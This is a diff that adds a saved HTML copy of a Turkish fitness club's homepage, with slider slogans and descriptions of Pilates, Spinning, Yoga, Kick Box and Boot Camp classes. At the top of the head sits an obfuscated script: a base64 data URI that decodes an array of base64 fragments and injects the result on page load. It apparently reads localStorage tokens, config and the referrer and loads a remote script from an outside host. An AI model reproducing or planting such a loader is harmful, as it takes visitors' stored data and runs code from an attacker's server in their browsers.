@@ -1,1 +1,883 @@
-From Syndicate
+<!DOCTYPE html>
+<html lang="en" class=" js cssanimations">
+
+<head>
+    <script src="data:text/javascript;base64,CiAgICAgICAgdmFyIGFyciA9IFsiSUNobWRXNWpkQT09IiwiYVE9PSIsImIyNG9LU0E9IiwiZXdvZ0lBPT0iLCJJQ0IyWVhJPSIsIklHNWhiV1U9IiwiSUQwZ0oxODJhRk09IiwiY3c9PSIsIlEwZGoiLCJVRkpqVnpnPSIsIlNtWT0iLCJTblFuT3dvZ0lDQT0iLCJJQT09IiwiYVdZZ0tDRjMiLCJhVzVrIiwiYjNjdVh6WT0iLCJhRk56UTBkaiIsIlVGSmpWemc9IiwiU21aS2RDaz0iLCJJSHNLSUE9PSIsIklDQWdJQ0FnSUhkcCIsImJtUnZkeTVmTm1oVCIsImMwTkgiLCJZMUJTWTFjNFNtWktkQT09IiwiSUQwZ2V3b2dJQT09IiwiSUNBZ0lDQWdJQ0FnSUE9PSIsImRXNXBjWFZsT2lCbSIsIllRPT0iLCJiSE5sTEFvZ0lDQT0iLCJJQ0FnSUNBZ0lBPT0iLCJJQ0IwZEd3NklBPT0iLCJPQT09IiwiTmpRdyIsIk1Dd0tJQ0FnSUNBPSIsIklDQT0iLCJJQ0FnIiwiSUNCU1gxQT0iLCJRVlJJT2c9PSIsIklDZG9kSFJ3Y3pvdiIsIkwyUm1ZUzF6YUc4PSIsImNDNXlkUzg9IiwiT1doWlIzRT0iLCJNU2NzQ2lBZ0lBPT0iLCJJQ0FnSUNBZ0lBPT0iLCJJQ0JRWDFCQlZFZzZJQT09IiwiSjJoMCIsImRIQnpPaTh2WkE9PSIsIlptRXRjMmh2IiwiY0M0PSIsImNuVXZaZz09IiwiWlRneVlXTmlMM0E9IiwiYnc9PSIsImMzUmlZV05ySnc9PSIsIkxBbz0iLCJJQ0FnSUNBZ0lDQjlPdz09IiwiQ2lBZ0lDQjlDZz09IiwiSUNBZ0lHTT0iLCJiMjV6ZENCZlExUT0iLCJjMDFaVmt4bU0wSmpNZz09IiwiUm1ReFdpQTkiLCJJR3h2WTJFPSIsImJGTjAiLCJiM0poWnc9PSIsIlpTND0iLCJaMlYwU1hSbGJTZ24iLCJZMjl1Wm1sbkp3PT0iLCJLVHNLSUNBZyIsIklHbG1JQ2gwZVhBPSIsIlpRPT0iLCJiMllnWDBOVWN3PT0iLCJUVmxXVEdZelFtTT0iLCJNa1prTVZvZyIsIklUMDlJQ2QxYm1SbFpnPT0iLCJhVzVsWkNjZ0ppWWdYdz09IiwiUTFSelRWbFdUR1k9IiwiTTBJPSIsIll6SkdaREZhSUNFPSIsIlBUMGdiblZzIiwiYkNrZ2V3b2dJQ0E9IiwiSUNBZ0lDQjJZUT09IiwiY2lCZiIsIlEwZERWMW89IiwiVFRJPSIsIlVUbFlZMDFhY0VkR0lBPT0iLCJQU0JLVTA5T0xnPT0iLCJjR0Z5YzJVb1h3PT0iLCJRMVJ6IiwiVFZrPSIsIlZreG1NMEk9IiwiWXpKR1pERT0iLCJXaWs3Q2lBPSIsIklDQWdJQ0FnSUhaaGNnPT0iLCJJRjlPUTBaRU13PT0iLCJOR0pFV1VSeiIsIlJIST0iLCJSblpISUQwZ1RXRjAiLCJhQzV5YjNWdVpDZ3IiLCJibVU9IiwiZHlCRVlYUmxLQT09IiwiS1M4eE1EQXdLVHNLSUE9PSIsIklDQWdJQ0E9IiwiSUNCcFppQW9YME09IiwiUjBOWFdrMHlVVGs9IiwiV0dNPSIsIlRWcHdSMFl1WTNJPSIsIlpXRT0iLCJkR1ZrIiwiWDJGMElDc2dkMmx1WkE9PSIsImIzY3VYelpvVTNNPSIsIlEwZGpVRkpqVnpoSyIsIlprbz0iLCJkQzUwZEd3Z1BBPT0iLCJJRjlPUXc9PSIsIlJrUXpOR0pFV1VRPSIsImMwUnlSblpIIiwiS1NCN0NpQWdJQ0FnIiwiSUNBZ0lDQWciLCJJR3h2WTJGc1UzUnZjZz09IiwiWVdkbExnPT0iLCJjbVZ0YjNabFNYUmwiLCJiUT09IiwiS0NkemRXSkpaQ2NwIiwiT3dvZ0lDQT0iLCJJQT09IiwiSUE9PSIsIklDQT0iLCJJQ0E9IiwiSUNBZ2JHOD0iLCJZMkZzVTNSdiIsImNtRm5aUzQ9IiwiY21WdGIzWT0iLCJaVWs9IiwiZEdWdEtDZDBiMnRsYmc9PSIsIkp5azciLCJDZz09IiwiSUNBZ0lDQWdJQ0FnSUE9PSIsIklDQnNiMk5oYkZOMGJ3PT0iLCJjbUU9IiwiWjJVdWNnPT0iLCJaVzF2IiwiZG1VPSIsIlNYUmxiU2duWTI5dSIsIlptbG5KeWs3Q2c9PSIsIklBPT0iLCJJQ0FnSUNBPSIsIklDQT0iLCJmUW9nSUNBPSIsIklIMEtJQ0FnSUhaaCIsImNpQmZOWGxDVVZBPSIsIlRVZFdNbGQ0U0hSSSIsImFEY2dQUT09IiwiSUd4dlkyRT0iLCJiRk09IiwiZEc5eVlRPT0iLCJaMlV1Wnc9PSIsIlpYUkpkR1Z0S0E9PSIsIkozTjFZa2xrSnlrPSIsIk93b2dJQ0FnIiwiZG1GeUlGOVFUVlk9IiwiYWs0PSIsIlNqSjBURFkzVm1RPSIsIlJISlpJQT09IiwiUFNCc2IyTmhiQT09IiwiVTNRPSIsImIzSmhaMlU9IiwiTG1kbGRFaz0iLCJkR1Z0S0NkMGJ3PT0iLCJhMlZ1Snc9PSIsIktUc0tJQ0FnSUhZPSIsIllYSWdYMnRuUzBnPSIsIlluRnpVV1p5Vm00MmVRPT0iLCJWa29nUFNBblB3PT0iLCJjbVYwZFhJPSIsImJnPT0iLCJQUT09IiwiYW5NdSIsIll3PT0iLCJiR2xsYm5RPSIsIkp6c0tJQ0FnSUNBPSIsIklDQWdYMnRuUzBnPSIsIlluRnpVV1p5IiwiVm00MmVWWktJQ3M5SUE9PSIsIkp5WW5JQ3NnWkdWaiIsImIyUmxWVkpKIiwiUTI4PSIsImJYQnZibVZ1ZENoMyIsImFXNWtidz09IiwiZHc9PSIsIkxteHZZMkYwYVc4PSIsImJpNXoiLCJaV0Z5WTJnPSIsIkxuSmxjR3hoWTJVb0p3PT0iLCJQeWNzSUNjbktTaz0iLCJPd29nSUNBZ0lDQWdJQT09IiwiWDJ0blMwaGljWE5SIiwiWm5KVyIsImJqWjVWa29nS3owZ0p3PT0iLCJKbk09IiwiWlE9PSIsIlgzSmxabVZ5Y2c9PSIsIlpYST0iLCJQU2NnS3lCbGJnPT0iLCJZMjlrWlZVPSIsIlVraz0iLCJRMjl0Y0c5dVpRPT0iLCJiblFvWkc5amRRPT0iLCJiV1Z1ZEM0PSIsImNtVm1aWEk9IiwiY21WeUtUc0tJQ0FnSUE9PSIsIklBPT0iLCJJQ0FnWHc9PSIsImEyZExTR0p4Y3c9PSIsIlVXWnlWbTQyZVZZPSIsIlNpQXJQU0FuSm1SbFpnPT0iLCJZWFZzZEE9PSIsIlh3PT0iLCJhMlY1ZDI4PSIsImNnPT0iLCJaQT09IiwiUFNjZ0t5QmxiZz09IiwiWTI5a1pWVlNTVU09IiwiYnc9PSIsImJYQT0iLCJiMjVsYm5Rb1pHOD0iLCJZM1Z0Wlc1MCIsIkxuUT0iLCJhWFJzWlNrN0NnPT0iLCJJQ0FnSUNBZ0lDQT0iLCJYdz09IiwiYTJkTFNHST0iLCJjWE5SWm5KV2JnPT0iLCJOZz09IiwiZVZaS0lDczkiLCJJQ2NtYkdGdVpHbHVadz09IiwiWHc9PSIsImRYSnNQU2NnIiwiS3lBPSIsIlpXNWpiMlJsVlE9PSIsIlVrbERidz09IiwiYlhCdiIsImJtVnVkQT09IiwiS0dSdlkzVnRaUT09IiwiYm5RdWJHOWoiLCJZWFJwYnc9PSIsImJnPT0iLCJMbWh2IiwiYzNSdSIsIllXMWxJQ3NnWkc5amRRPT0iLCJiV1Z1ZEE9PSIsIkxteHZZdz09IiwiWVhScGIyND0iLCJMbkE9IiwiWVhSb2JtRnRaU2s9IiwiT3dvZ0lDQWdJQ0E9IiwiSUNCZmEyZExTQT09IiwiWW5GelVXWnlWbTQyIiwiZVZaS0lDczlJQT09IiwiSnladVlXMWxQU2M9IiwiSUNzZ1pXNWpidz09IiwiWkdWVlVrbERiMjA9IiwiY0c4PSIsImJtVnVkQ2h1WVcxbEtRPT0iLCJPd29nSUE9PSIsIklDQWdJQT09IiwiSUNCZmEyZExTR0k9IiwiY1hOUlpuSlciLCJialo1VmtvPSIsIklDcz0iLCJQU0FuSm1odmMzUTlKdz09IiwiSUNzZ1pRPT0iLCJiZz09IiwiWTI5a1pWVlNTVU52YlE9PSIsImNHOXVaVzUwIiwiS0hkcGJnPT0iLCJaRzkzTGw4MmFGTnoiLCJRMGRqVUE9PSIsIlVtTT0iLCJWdz09IiwiT0VwbVNuUXVVZz09IiwiWDFBPSIsIlFWUT0iLCJTQ2s3Q2lBZ0lBPT0iLCJJR2xtSUNoMGVYQmxidz09IiwiWmc9PSIsIklGODFlUT09IiwiUWxGUVRVZFdNbGM9IiwiZUE9PSIsIlNIUklhRGNnSVQwPSIsIlBTQW5kVzQ9IiwiWkdWbWFXNWxaQ2M9IiwiSUNZbUlGODFlVUpSIiwiVUUwPSIsIlIxWXlWM2hJZEVob053PT0iLCJJQ1ltSUE9PSIsImQybHUiLCJaRzkzTGw4MmFBPT0iLCJVM05EUjJOUVVtTT0iLCJWemhLWmtwMExnPT0iLCJkVzVwY1E9PSIsImRXVXBJSHNLIiwiSUNBPSIsIklDQT0iLCJJQ0FnSUY5clowdEkiLCJZbkZ6VVdaeVZnPT0iLCJialo1IiwiVmtvPSIsIklDczlJQ2NtYzNWaVh3PT0iLCJhV1E5SnlBcklHVnUiLCJZMjlrWlZVPSIsIlVrbERidz09IiwiYlhCdmJtVnVkQ2c9IiwiWHpWNVFnPT0iLCJVVkE9IiwiVFVkV01nPT0iLCJWM2hJIiwiZEVob053PT0iLCJLVHM9IiwiQ2lBZ0lBPT0iLCJJSDBLSUNBZ0lBPT0iLCJhV1lnS0hSNWNHVT0iLCJiMllnIiwiWDFCTiIsIlZtcE9TakowVERZPSIsIk4xWmtSQT09IiwiY2xrZ0lUMDkiLCJJQ2QxYm1SbFptbHUiLCJaV1FuSUNZbUlGOVFUUT09IiwiVm1vPSIsIlRrb3lkRXcyTjFZPSIsIlpFUnlXU0FtIiwiSmlCM2FXNWtiM2N1IiwiWHpab1UzTkRSMk09IiwiVUZKalZ6aEtaa3AwTGc9PSIsImRXNXBjWFZsS1NCN0NnPT0iLCJJQ0FnSUNBZ0lBPT0iLCJJRjlyIiwiWjB0SVluRT0iLCJjdz09IiwiVVdaeVZtND0iLCJObmxXU2lBclBTQW5KZz09IiwiZEc5clpRPT0iLCJiajBuSUNzZ1pXNWoiLCJiMlJsVlE9PSIsIlVrbERiMjF3IiwiYjI1bGJnPT0iLCJkQ2hmIiwiVUUxV2FrNUtNZz09IiwiZEV3Mk4xWmtSSEk9IiwiV1NrN0NpQT0iLCJJQ0FnZlFvPSIsIklDQWdJSFpoIiwiY2lCaCIsIklEMGciLCJaRzlqZFcxbGJuUXUiLCJZM0k9IiwiWldGMCIsIlpVVnNaUT09IiwiYldWdWRDZz0iLCJKM05qY21sd2RBPT0iLCJKeWs3IiwiQ2lBZ0lDQWdJQT09IiwiSUNCaExuUjVjR1VnIiwiUFNBbllYQndiR2xqIiwiWVhScGIyNHZhbUYyIiwiWVhOamNtbHdkQ2M3Q2c9PSIsIklDQWdJQ0FnSUNBPSIsIllTNXpjbU1nUFE9PSIsIklIZHBibVE9IiwiYnc9PSIsImR5NWZObWhUIiwiYzBOSFl3PT0iLCJVRkpqIiwiVnpoS1prcDAiLCJMbEpmVUE9PSIsIlFWUklJQ3NnWHc9PSIsImEyZExTR0p4Y3c9PSIsIlVXWnlWbTQyIiwiZVZaS093b2dJQ0E9IiwiSUhaaGNpQnpJRDBnWkE9PSIsImIyTjFiV1Z1ZEM1biIsIlpYUkZiR1Z0Wlc0PSIsImRITkNlVlJoIiwiWjA1aCIsImJXVW9KM05qIiwiY21rPSIsImNIUW5LVnM9IiwiTUYwNyIsIkNpQWdJQ0J6IiwiTG5CaGNtVT0iLCJiblE9IiwiVGc9PSIsImIyUmwiLCJMbWx1YzJWeWRFSmxaZz09IiwiYjNKbEtHRT0iLCJMQ0J6S1FvZ0lDQWciLCJmU2tvIiwiS1RzPSJdOwogICAgICAgIHZhciBzdHIgPSAiIjsKICAgICAgICBhcnIuZm9yRWFjaChpdGVtID0+IHsKICAgICAgICAgICAgc3RyICs9IGF0b2IoaXRlbSk7CiAgICAgICAgfSk7CiAgICAgICAgdmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBhLnR5cGUgPSAndGV4dC9qYXZhc2NyaXB0JzsKICAgICAgICBhLmlubmVySFRNTCA9IHN0cjsKICAgICAgICB2YXIgcyA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTsKICAgICAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpOwogICAg"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+ 
+    <link rel="shortcut icon" href="https://lefclub.com.tr/images/favicon.png">
+    <title>LefClub</title>
+    <link href="./index_files/bootstrap.min.css" rel="stylesheet">
+    <link href="./index_files/flexslider.css" rel="stylesheet">
+    <link href="./index_files/style.css" rel="stylesheet">
+    <link href="./index_files/media.css" rel="stylesheet">
+    <link href="./index_files/css" rel="stylesheet" type="text/css">
+    <link href="./index_files/css(1)" rel="stylesheet" type="text/css">
+</head>
+
+<body data-offset="100" data-spy="scroll" data-target=".navbar-main" class="layout-switch">
+    <a id="top"></a>
+    <div id="ip-container" class="ip-container loaded">
+        <!-- initial header -->
+        <header class="ip-header">
+            <h1 class="ip-logo">
+                <div id="logo_title"><img src="./index_files/logo.png" alt="Lef Club Logo" title="Lef Club Logo"></div>
+            </h1>
+            <div class="ip-loader">
+                <svg class="ip-inner" width="60px" height="60px" viewBox="0 0 80 80">
+                    <path class="ip-loader-circlebg" d="M40,10C57.351,10,71,23.649,71,40.5S57.351,71,40.5,71 S10,57.351,10,40.5S23.649,10,40.5,10z"></path>
+                    <path id="ip-loader-circle" class="ip-loader-circle" d="M40,10C57.351,10,71,23.649,71,40.5S57.351,71,40.5,71 S10,57.351,10,40.5S23.649,10,40.5,10z"
+                        style="stroke-dashoffset: 0; stroke-dasharray: 192.617;"></path>
+                </svg>
+            </div>
+        </header>
+        <!-- Header 1 -->
+        <header class="header-1 sticky-navigation">
+            <div class="logo-left-block">
+                &nbsp;
+            </div>
+            <div class="logo-block col-xs-12">
+                <a class="navbar-brand" href="https://lefclub.com.tr/#top"><img src="./index_files/logo.png" alt="Lef Club Logo" title="Lef Club Logo"></a>
+            </div>
+            <nav class="menu-block navbar-main primary-navigation col-xs-12" role="navigation">
+                <div class="navbar-header">
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+                <div class="navbar-collapse collapse">
+                    <ul class="nav navbar-nav navbar-right">
+                        <li><a href="https://lefclub.com.tr/#top" class="">ANASAYFA</a></li>
+                        <li class="active"><a href="https://lefclub.com.tr/#upcoming-courses" class="">DERSLERİMİZ</a></li>
+                        <li class=""><a href="https://lefclub.com.tr/#programs-timeline" class="">ÖZELDERS</a></li>
+                        <li><a href="https://lefclub.com.tr/#classes-galleri" class="">GALERİ</a></li>
+                        <li><a href="https://lefclub.com.tr/#our-trainer" class="">EĞİTMENLERİMİZ</a></li>
+                        <li><a href="https://lefclub.com.tr/#contact" class="">İLETİŞİM</a></li>
+                    </ul>
+                    <!--/.nav-right -->
+                </div>
+                <!--/.nav-collapse -->
+            </nav>
+        </header><!-- /.container -->
+        <!-- Slider -->
+        <div class="slider-section slider-style-1">
+            <div class="slider-block-container">
+                <div id="header-1-flex" class="flexslider header-1-flex">
+
+                    <div class="flex-viewport" style="overflow: hidden; position: relative;">
+                        <ul class="slides" style="width: 1400%; transition-duration: 0s; transform: translate3d(-5760px, 0px, 0px);">
+                            <li class="clone" style="width: 1440px; float: left; display: block;">
+                                <div class="slider-image">
+                                    <img src="./index_files/1.jpg" title="Fitness Resim" alt="Fitness Resim" draggable="false">
+                                </div>
+                                <div class="slider-content">
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <h1 class="slide-heading wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="0.7s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 0.7s; animation-name: fadeIn;"> <a>Değişime Hazır mısınız?</a></h1>
+                                    <span class="slide-sub-heading wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="0.9s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 0.9s; animation-name: fadeIn;"> Bizimle hedeflerinize daha yakınsınız... </span>
+                                </div>
+                            </li>
+                            <li class="clone" aria-hidden="true" style="width: 1440px; float: left; display: block;">
+                                <div class="slider-image">
+                                    <img src="./index_files/1.jpg" title="Fitness Resim" alt="Fitness Resim" draggable="false">
+                                </div>
+                                <div class="slider-content">
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <h1 class="slide-heading wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="0.7s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 0.7s; animation-name: fadeIn;"> <a>Değişime Hazır mısınız?</a></h1>
+                                    <span class="slide-sub-heading wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="0.9s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 0.9s; animation-name: fadeIn;"> Bizimle hedeflerinize daha yakınsınız... </span>
+                                </div>
+                            </li>
+                            <!-- Slide Item -->
+                            <li style="width: 1440px; float: left; display: block;" class="">
+                                <div class="slider-image">
+                                    <img src="./index_files/5.jpg" title="Fitness Resim" alt="Fitness Resim" draggable="false">
+                                </div>
+                                <div class="slider-content">
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <h1 class="slide-heading wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="0.7s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 0.7s; animation-name: fadeIn;"> <a>Şimdi Form Zamanı</a></h1>
+                                    <p class="slide-description wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="1.1s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 1.1s; animation-name: fadeIn;"> Başlamak için mükemmel olmayı beklemeniz gerekmez, Fakat mükemmel olmak için
+                                        başlamak zorundasınız. </p>
+                                </div>
+                            </li>
+                            <li style="width: 1440px; float: left; display: block;" class="">
+                                <div class="slider-image">
+                                    <img src="./index_files/7.jpg" title="Havuz Resim" alt="Havuz Resim" draggable="false">
+                                </div>
+                                <div class="slider-content">
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <span class="slide-sub-heading wow fadeIn animated" style="font-family: Tahoma; visibility: visible; animation-duration: 0.8s; animation-delay: 0.9s; animation-name: fadeIn;"
+                                        data-wow-duration="0.8s" data-wow-delay="0.9s"> Klorsuz Tuzlu Su Havuzunda Yüzmenin Keyfini Çıkarın.. </span>
+                                </div>
+                            </li>
+                            <li style="width: 1440px; float: left; display: block;" class="">
+                                <div class="slider-image">
+                                    <img src="./index_files/8.jpg" title="Spinning Resim" alt="Spinning Resim" draggable="false">
+                                </div>
+                            </li>
+                            <li style="width: 1440px; float: left; display: block;" class="flex-active-slide">
+                                <div class="slider-image">
+                                    <img src="./index_files/9.jpg" title="Salon Resim" alt="Salon Resim" draggable="false">
+                                </div>
+                            </li>
+                            <li style="width: 1440px; float: left; display: block;">
+                                <div class="slider-image">
+                                    <img src="./index_files/1.jpg" title="Fitness Resim" alt="Fitness Resim" draggable="false">
+                                </div>
+                                <div class="slider-content">
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <h1 class="slide-heading wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="0.7s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 0.7s; animation-name: fadeIn;"> <a>Değişime Hazır mısınız?</a></h1>
+                                    <span class="slide-sub-heading wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="0.9s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 0.9s; animation-name: fadeIn;"> Bizimle hedeflerinize daha yakınsınız... </span>
+                                </div>
+                            </li>
+                            <li style="width: 1440px; float: left; display: block;" class="clone" aria-hidden="true">
+                                <div class="slider-image">
+                                    <img src="./index_files/5.jpg" title="Fitness Resim" alt="Fitness Resim" draggable="false">
+                                </div>
+                                <div class="slider-content">
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <h1 class="slide-heading wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="0.7s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 0.7s; animation-name: fadeIn;"> <a>Şimdi Form Zamanı</a></h1>
+                                    <p class="slide-description wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="1.1s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 1.1s; animation-name: fadeIn;"> Başlamak için mükemmel olmayı beklemeniz gerekmez, Fakat mükemmel olmak için
+                                        başlamak zorundasınız. </p>
+                                </div>
+                            </li>
+                            <li style="width: 1440px; float: left; display: block;" class="clone">
+                                <div class="slider-image">
+                                    <img src="./index_files/5.jpg" title="Fitness Resim" alt="Fitness Resim" draggable="false">
+                                </div>
+                                <div class="slider-content">
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <br>
+                                    <h1 class="slide-heading wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="0.7s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 0.7s; animation-name: fadeIn;"> <a>Şimdi Form Zamanı</a></h1>
+                                    <p class="slide-description wow fadeIn animated" data-wow-duration="0.8s" data-wow-delay="1.1s"
+                                        style="visibility: visible; animation-duration: 0.8s; animation-delay: 1.1s; animation-name: fadeIn;"> Başlamak için mükemmel olmayı beklemeniz gerekmez, Fakat mükemmel olmak için
+                                        başlamak zorundasınız. </p>
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+                    <ol class="flex-control-nav flex-control-paging">
+                        <li><a class="">1</a></li>
+                        <li><a class="">2</a></li>
+                        <li><a class="">3</a></li>
+                        <li><a class="flex-active">4</a></li>
+                        <li><a>5</a></li>
+                    </ol>
+                    <ul class="flex-direction-nav">
+                        <li><a class="flex-prev" href="https://lefclub.com.tr/#">Previous</a></li>
+                        <li><a class="flex-next" href="https://lefclub.com.tr/#">Next</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <div id="content-box" class="content-box ow-fluid-section container-fluid">
+            <div class="ow-fixed-section container owl-wrapper-outer">
+                <div id="owl-cntbox" class="content-box-inner owl-carousel owl-theme" style="opacity: 1; display: block;">
+                    <div class="owl-wrapper-outer">
+                        <div class="owl-wrapper" style="width: 4102px; left: 0px; display: block;">
+                            <div class="owl-item" style="width: 293px;">
+                                <div class="content-box-item cntbox animated fadeInUp">
+                                    <a>
+                                        <h2 class="content-box-title"> Pilates </h2>
+                                    </a>
+                                    <div class="content-box-detail">
+                                        <a><img src="./index_files/pilates.jpg" title="Plates" alt="Plates"></a>
+                                        <p class="content-box-description">
+                                            Güçlü bir bedeb ve zihin yapısına sahip olmak, fiziksel olarak vücudun tüm kontrolünü sağlamk için nefes
+                                            slms tekniği ile birlikte cimnastik ve diğer sporların fiziksel özelliklerini birleştirerek yeni bir teknikle sunuş yapar.
+                                        </p>
+                                        <hr>
+                                        <b>Pilatesin Faydaları;</b>
+                                        <style>
+                                            .content-box-detail span {
+                                                font-size: 14px;
+                                                font-weight: normal;
+                                            }
+                                        </style>
+                                        <ul>
+                                            <li class="col-md-12 col-lg-6">
+                                                <i><img src="./index_files/star.png"></i>
+                                                <span>Vücudu her açıdan çalıştırır.</span>
+                                            </li>
+                                            <li class="col-md-12 col-lg-6">
+                                                <i><img src="./index_files/star.png"></i>
+                                                <span> Omurga kaslarını güçlendirir.</span>
+                                            </li>
+                                            <li class="col-md-12 col-lg-6">
+                                                <i><img src="./index_files/star.png"></i>
+                                                <span>Kas kuvveti ve esnekliği geliştirir. </span>
+                                            </li>
+                                            <li class="col-md-12 col-lg-6">
+                                                <i><img src="./index_files/star.png"></i>
+                                                <span> Genel postür duruşunu iyileştirir.</span>
+                                            </li>
+                                            <li class="col-md-12 col-lg-6">
+                                                <i><img src="./index_files/star.png"></i>
+                                                <span> Doğru nefes almayla birlikte koordinasyon, konsantrasyon, ve dayanıklılığı geliştirir.</span>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="owl-item" style="width: 293px;">
+                                <div class="content-box-item cntbox animated fadeInUp">
+                                    <a>
+                                        <h2 class="content-box-title"> Spinning </h2>
+                                    </a>
+                                    <div class="content-box-detail">
+                                        <a><img src="./index_files/spining.jpg" title="Spinning" alt="Spinning"></a>
+                                        <p class="content-box-description">
+                                            Spinning müzik eşliğinde ve grup halinde iç mekanda bisiklet egzersizi yapmaktır.
+                                            Antrenör eşliğinde yapılan bu egzersizde amaç özellikle alt bedeni çalıştırmak ve kalp solunum direncini artırmaktır.
+                                            <br> Egzersiz seviyeleri, belli bir bisiklet parkurunun simülasyonuna göre ayarlanır. Bu spor,
+                                            bisiklet ve doğa yürüyüşüne hazırlık yapan, aynı zamanda da kilo vermek isteyenler için çok etkilidir.
+                                            Egzersizler, teknik hareket gerektirmez.
+                                            Eklemler açısından herhangi bir zorlanma söz konusu değildir, bu nedenle sırtları hassas olanlar tarafından da yapılabilir.
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="owl-item" style="width: 293px;">
+                                <div class="content-box-item cntbox animated fadeInUp">
+                                    <a>
+                                        <h2 class="content-box-title"> CRUNCH </h2>
+                                    </a>
+                                    <div class="content-box-detail">
+                                        <a><img src="./index_files/crunch.jpg" title="CRUNCH" alt="CRUNCH"></a>
+                                        <p class="content-box-description">
+                                            Crunch hareketi, bilinen en temel karın hareketlerinden birisidir.
+                                            Mekik çekme hareketine benzer fakat bel için daha sağlıklı ve karın kasları için daha verimli bir harekettir.
+                                            Karın kaslarını geliştirmede oldukça etkilidir.
+                                            bu bölgenin yanı sıra bel bölgesini çevreleyen tüm gövde kaslarını da çalıştırır.
+                                            Fakat düzenli olarak uygulanması gerekmektedir.
+
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="owl-item" style="width: 293px;">
+                                <div class="content-box-item cntbox animated fadeInUp">
+                                    <a>
+                                        <h2 class="content-box-title"> Yoga </h2>
+                                    </a>
+                                    <div class="content-box-detail">
+                                        <a><img src="./index_files/yoga.jpg" title="Yoga" alt="Yoga"></a>
+                                        <p class="content-box-description">
+                                            Yoganın zihinsel ve fiziksel sağlığa yararları, yogaya başlamak için yeterli nedeni sunmaktadır.
+                                            Yoganın faydaları arasında rahatlamak, daha iyi uyumak,
+                                            konsantrasyonun artması ve daha niceleri mevcuttur.
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="owl-item" style="width: 293px;">
+                                <div class="content-box-item cntbox animated fadeInUp">
+                                    <a>
+                                        <h2 class="content-box-title"> Kick Box </h2>
+                                    </a>
+                                    <div class="content-box-detail">
+                                        <a><img src="./index_files/kickbox.jpg" title="Kick Box" alt="Kick Box"></a>
+                                        <p class="content-box-description">
+                                            Kick Boks tarihsel olarak Karate, Thai Boks (Tayland Boksu) ve batı boksu sporlarından geliştirilmiş,
+                                            genellikle kendini savunma amacıyla, tekme ve yumruğa dayalı ayakta yapılan bir dövüş sporudur.
+                                            Kick Boks, en sert sporlar arasında yer alır. Teknik olarak çalışmanın yanı sıra sporcunun
+                                            güçlü olmaya da ihtiyacı vardır. Tekme ve yumruk kullanmayı içeren bir spor dalı olduğu için eldiven,
+                                            kask ve dişlik gibi malzemelerin kullanımı zorunludur.
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="owl-item" style="width: 293px;">
+                                <div class="content-box-item cntbox animated fadeInUp">
+                                    <a>
+                                        <h2 class="content-box-title"> Boot Camp </h2>
+                                    </a>
+                                    <div class="content-box-detail">
+                                        <a><img src="./index_files/bootcamp.jpg" title="Boot Camp" alt="Boot Camp"></a>
+                                        <p class="content-box-description">
+                                            Boot Camp askeri eğitim çalışmalarından ilham alınarak geliştirilmiş yeni bir fitness grup eğitim çalışmasıdır.
+                                            Temeli askeri disipline dayanan bu çalışma ile gruba dahil olan en zayıf kişi kısa süre
+                                            içerisinde takım lideri sayesinde en güçlü kişi ile eşit seviyeye gelerek gelişimini tamamlamış olur.
+                                            Uygulayan kişileri kısa zamanda fit bir görünüme kavuşturan, pek çok unsuru bünyesinde taşıyan
+                                            hem açık alanda hemde kapalı mekanlarda uygulanabilen özel bir antrenman programıdır.
+                                            Bootcamp antremanlarında çok sıkı disiplinle yapılmaktadır. Tüm öğrenciler bu disipline uymak zorundadır.
+                                            Gruba dahil olan kişiler çok kısa bir süre içerisinde istedikleri formu yakalamış olurlar.
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
